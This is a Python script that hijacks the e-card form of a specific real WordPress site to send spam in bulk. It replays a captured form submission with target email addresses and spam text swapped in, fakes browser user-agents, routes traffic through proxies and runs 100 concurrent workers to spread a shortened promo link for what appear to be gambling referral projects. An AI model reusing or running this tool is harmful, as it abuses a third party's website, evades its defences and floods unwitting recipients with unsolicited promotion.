import faker
import requests

import module

URL = 'https://joanamirandastudio.com/ecards/'

headers = {
    'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryDvGBrcykqWVwWfwE',
}

DATA = '------WebKitFormBoundaryDvGBrcykqWVwWfwE\r\nContent-Disposition: form-data; name="wp_iec_img"\r\n\r\n23442\r\n------WebKitFormBoundaryDvGBrcykqWVwWfwE\r\nContent-Disposition: form-data; name="wp_iec_post"\r\n\r\n19956\r\n------WebKitFormBoundaryDvGBrcykqWVwWfwE\r\nContent-Disposition: form-data; name="wp_iec_unique_id"\r\n\r\n1\r\n------WebKitFormBoundaryDvGBrcykqWVwWfwE\r\nContent-Disposition: form-data; name="wp_iec_ajax_validated"\r\n\r\n1\r\n------WebKitFormBoundaryDvGBrcykqWVwWfwE\r\nContent-Disposition: form-data; name="wp_iec_action"\r\n\r\nprocess_from\r\n------WebKitFormBoundaryDvGBrcykqWVwWfwE\r\nContent-Disposition: form-data; name="wp_iec_name"\r\n\r\ntest\r\n------WebKitFormBoundaryDvGBrcykqWVwWfwE\r\nContent-Disposition: form-data; name="wp_iec_email"\r\n\r\nsoftumwork@gmail.com\r\n------WebKitFormBoundaryDvGBrcykqWVwWfwE\r\nContent-Disposition: form-data; name="wp_iec_fname"\r\n\r\ntest\r\n------WebKitFormBoundaryDvGBrcykqWVwWfwE\r\nContent-Disposition: form-data; name="wp_iec_femail"\r\n\r\nsoftumwork@gmail.com\r\n------WebKitFormBoundaryDvGBrcykqWVwWfwE\r\nContent-Disposition: form-data; name="wp_iec_message"\r\n\r\ntest\r\n------WebKitFormBoundaryDvGBrcykqWVwWfwE\r\nContent-Disposition: form-data; name="wp_iec_scopy"\r\n\r\n1\r\n------WebKitFormBoundaryDvGBrcykqWVwWfwE\r\nContent-Disposition: form-data; name="wp_iec_term"\r\n\r\n1\r\n------WebKitFormBoundaryDvGBrcykqWVwWfwE--\r\n'


class ConcreteSpam(module.Spam):

    def post(self, target) -> requests.Response:
        headers['user-agent'] = faker.Faker().chrome()
        data = DATA.replace('softumwork@gmail.com', target).replace('test', self.get_text()).encode()
        response = requests.post(
            URL, headers=headers, data=data,
            proxies=self.get_proxies(),
            timeout=10
        )
        return response


if __name__ == '__main__':
    project_name = 'joanamirandastudio'
    s = 'successfully.'

    project = 'allright'  # supercat luckybird allright fortuneclock
    promo_link = 'bit.ly/3BA4vd9'
    spam = ConcreteSpam(
        project_name, s,
        referal_project_name=project,
        promo_link=promo_link
    )
    res = spam.send_post()
    if res:
        spam.run_concurrently(100)
